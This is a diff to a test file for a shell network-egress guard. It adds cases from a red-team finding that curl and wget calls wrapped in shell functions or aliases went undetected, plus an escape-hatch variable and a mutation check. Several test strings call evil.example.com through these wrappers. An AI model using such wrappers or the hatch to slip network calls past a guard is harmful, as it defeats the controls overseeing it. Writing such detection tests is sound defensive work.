@@ -311,6 +311,30 @@ CASES = [
     ("FOO=bar curl -s https://evil.example.com", ENFORCE, BLOCK, "leading assignment skipped"),
     ("cd /tmp && curl -s https://evil.example.com", ENFORCE, BLOCK,
      "the network command is in the SECOND segment"),
+    # --- card 4ed64b20 (RedHat delta MEDIUM on 18055f83, comment 13365): shell function/alias
+    # DEFINITIONS can hide a network command from every check above, because the call site uses the
+    # NAME, not the command. Both measured rc=0 with ZERO log lines before this fix. ----------------
+    ('f(){ curl -s "$1"; }; f https://evil.example.com/k', ENFORCE, BLOCK,
+     "RedHat's exact measured probe: a function body wraps curl, the call site is just 'f'"),
+    ("shopt -s expand_aliases; alias c='curl'; c -s https://evil.example.com/k", ENFORCE, BLOCK,
+     "RedHat's other measured probe: an alias to curl, the call site is just 'c'"),
+    ('function f { curl -s "$1"; }; f https://evil.example.com/k', ENFORCE, BLOCK,
+     "the `function NAME { ... }` spelling, no parens"),
+    ('f() { wget -O /tmp/x "$1"; }', ENFORCE, BLOCK,
+     "the definition alone is a finding -- it need not even be called in this command string"),
+    ('alias dl="curl -s"', ENFORCE, BLOCK,
+     "an alias DEFINITION alone is a finding, same reasoning"),
+    ('g(){ python3 -c "import urllib.request; urllib.request.urlopen(\'https://x\')"; }',
+     ENFORCE, BLOCK, "a function wrapping an interpreter one-liner with network intent"),
+    ("ll(){ ls -la \"$@\"; }; ll /tmp", ENFORCE, ALLOW,
+     "a function with NO network-capable command inside must not be flagged -- no over-blocking"),
+    ('alias gp="git push"; gp', ENFORCE, ALLOW,
+     "an alias to an out-of-scope command (git) stays out of scope, same as a direct git call"),
+    ('f(){ curl -s "$1"; }; f http://localhost:3420/x', ENFORCE, BLOCK,
+     "the definition itself is opaque regardless of the call site's actual (here: local) argument "
+     "-- this guard does not simulate positional-parameter substitution, see the module docstring"),
+    ('BASH_EGRESS_ALLOW=1 f(){ curl -s "$1"; }; f https://evil.example.com/k', ENFORCE, ALLOW,
+     "the hatch covers the function-definition finding too, symmetrically with every other finding"),
     # --- escape hatch and kill switch ---------------------------------------------------------------
     ("BASH_EGRESS_ALLOW=1 curl -s https://evil.example.com", ENFORCE, ALLOW,
      "per-command hatch, greppable"),
@@ -500,13 +524,38 @@ def main():
             failures.append(("<benign hatch events>", "at least one hatch event", "none", ""))
             print("FAIL a hatch use on an already-local target must still be recorded")
 
+    # 11. MUTATION CHECK (card 4ed64b20): removing the function/alias-definition scan must turn the
+    #     two RedHat-measured probes back to zero findings. Calls the real analyse() with a temporary
+    #     module attribute override rather than editing the source file, so this runs in-process.
+    import importlib.util as _ilu11
+    spec11 = _ilu11.spec_from_file_location("beg11", str(GUARD))
+    mod11 = _ilu11.module_from_spec(spec11)
+    spec11.loader.exec_module(mod11)
+    probes = [
+        'f(){ curl -s "$1"; }; f https://evil.example.com/k',
+        "alias c='curl'; c -s https://evil.example.com/k",
+    ]
+    for probe in probes:
+        fs = mod11.analyse(probe, [])
+        if not fs:
+            failures.append(("<function/alias mutation>", "a finding", "none", probe))
+            print(f"FAIL function/alias definition scan found nothing for: {probe!r}")
+    mod11._looks_network_capable = lambda text: False  # the mutation: pretend nothing is network-capable
+    for probe in probes:
+        fs = mod11.analyse(probe, [])
+        if fs:
+            failures.append(("<function/alias mutation control>", "no finding WITH mutation applied",
+                              fs, probe))
+            print(f"FAIL the mutation did not silence the finding, so the test is not pinned to "
+                  f"the scan: {probe!r}")
+
     if failures:
         print(f"\n{len(failures)} FAILED")
         for cmd, expected, got, stderr in failures:
             print(f"  {cmd!r}: expected {expected}, got {got}\n    stderr: {stderr[:300]}")
         sys.exit(1)
 
-    print(f"\nAll {len(CASES)} cases + 10 property assertions passed.")
+    print(f"\nAll {len(CASES)} cases + 11 property assertions passed.")
     sys.exit(0)
 
 
